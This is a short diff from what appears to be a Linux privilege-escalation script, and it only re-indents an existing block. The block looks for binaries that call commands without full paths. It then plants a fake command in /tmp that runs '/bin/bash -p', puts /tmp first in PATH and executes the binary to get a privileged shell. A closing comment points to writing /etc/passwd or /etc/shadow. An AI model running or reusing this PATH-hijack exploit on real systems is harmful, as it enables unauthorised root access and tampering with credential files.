@@ -394,13 +394,13 @@ def path():
             lines_strings = strings_file.readlines()
             for cmd in common_cmds:
                non_path_cmd = re.search("\s{}\s".format(cmd), str(lines_strings))
-                  if non_path_cmd:
-                     print("### {} does not specify full path of {} ###".format(line,cmd))
-                     os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
-                     os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
-                     break
-                  else:
-                     continue
+               if non_path_cmd:
+                  print("### {} does not specify full path of {} ###".format(line,cmd))
+                  os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
+                  os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
+                  break
+               else:
+                  continue
 
 
 # try writing to /etc/passwd or /etc/shadow
